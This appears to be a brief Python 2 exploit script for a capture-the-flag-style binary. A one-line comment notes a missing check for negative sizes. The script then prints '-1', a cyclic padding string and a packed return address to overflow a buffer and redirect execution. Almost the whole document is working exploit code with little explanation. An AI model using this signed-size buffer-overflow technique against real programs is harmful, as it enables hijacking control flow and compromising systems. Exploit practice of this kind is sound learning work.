#in the source code we can see that it is checking weather the size is greater than 100 but its not checking if its less than 0 and its simple buffer overflow
from struct import pack
print "-1\n"+"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5"+pack('<I',0x080491c2)